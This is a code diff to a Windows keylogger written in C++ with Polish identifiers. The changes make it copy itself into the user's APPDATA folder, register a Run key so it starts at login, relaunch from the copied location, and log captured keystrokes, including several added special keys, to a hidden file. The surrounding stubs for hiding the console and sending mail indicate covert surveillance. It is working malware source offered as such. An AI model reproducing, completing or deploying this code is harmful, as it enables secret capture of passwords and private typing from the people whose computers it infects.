@@ -5,6 +5,9 @@
 
 using namespace std;
 
+const string SCIEZKA_W_SYSTEMIE = getenv("APPDATA")+string("\\KeyloggerLive.exe");
+const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.txt");
+
 bool antyDuplikacja()
 {
     CreateMutex(NULL, TRUE, "5da64e2b2ed82f3ac144d1a87f78b16ahakeredupl");
@@ -23,19 +26,31 @@ void ukryjKonsole()
     //FreeConsole();
 }
 
-void dodajDoAutostartu(string sciezka)
+void kopiujDoSystemu(string sciezka)
 {
-    string komenda = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KeyloggerTEST /t REG_SZ /d ";
-    komenda.append(sciezka);
-    cout << komenda << endl;
+    string komenda = "copy "+sciezka+" "+SCIEZKA_W_SYSTEMIE;
     system(komenda.c_str());
-    //Zaimplementuj dodawanie do autostartu
 }
 
-void kopiujDoSystemu()
+void dodajDoAutostartu(string sciezka)
 {
-    //Kopiowanie keylogger.exe do folderu gdzies w systemie
+    string komenda = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KeyloggerTEST /f /t REG_SZ /d ";
+    komenda.append(SCIEZKA_W_SYSTEMIE);
+    cout << komenda << endl;
+    system(komenda.c_str());
+
+    kopiujDoSystemu(sciezka);
+
+    if (sciezka!=SCIEZKA_W_SYSTEMIE)
+    {
+        string komenda = "start ";
+        komenda.append(SCIEZKA_W_SYSTEMIE);
+        system(komenda.c_str());
+        exit(EXIT_SUCCESS);
+    }
+
 }
+
 
 void wyslijMaila()
 {
@@ -45,7 +60,7 @@ void wyslijMaila()
 void zapiszLogi(int liczba)
 {
     FILE * plik;
-    plik = fopen("logi.txt", "a");
+    plik = fopen(SCIEZKA_LOGOW.c_str(), "a");
     if (plik!=NULL)
     {
         fputc((char)liczba, plik);
@@ -88,6 +103,10 @@ void wlaczKeyloggera()
             }
         }
 
+        /*
+                ZNAKI SPECJALNE
+        */
+
         if (GetAsyncKeyState(VK_SPACE)==-32767)
         {
             cout << " ";
@@ -98,33 +117,50 @@ void wlaczKeyloggera()
         {
             cout << "[ENTER]";
         }
-
         if (GetAsyncKeyState(VK_BACK)==-32767)
         {
             cout << "[BS]";
-            zapiszLogi(8);
         }
-
+        if (GetAsyncKeyState(VK_CAPITAL)==-32767)
+        {
+            cout << "[CS]";
+        }
         if (GetAsyncKeyState(VK_DELETE)==-32767)
         {
             cout << "[DEL]";
         }
-
         if (GetAsyncKeyState(VK_TAB)==-32767)
         {
-            cout << "[DEL]";
+            cout << "[TAB]";
+        }
+        if (GetAsyncKeyState(VK_ESCAPE)==-32767)
+        {
+            cout << "[ESC]";
+        }
+        if (GetAsyncKeyState(VK_MENU)==-32767)
+        {
+            cout << "[ALT]";
+        }
+        if (GetAsyncKeyState(VK_SNAPSHOT)==-32767)
+        {
+            cout << "[PRTSC]";
+        }
+        if (GetAsyncKeyState(VK_TAB)==-32767)
+        {
+            cout << "[TAB]";
         }
     }
 }
 
-int main()
+int main(int argc, char * argv[])
 {
     if (!antyDuplikacja())
     {
         ukryjKonsole();
-        dodajDoAutostartu("C:\\keylogger\\");
-        kopiujDoSystemu();
+        Sleep(3000);
+        dodajDoAutostartu(argv[0]);
         wlaczKeyloggera();
     }
+
     return 0;
 }
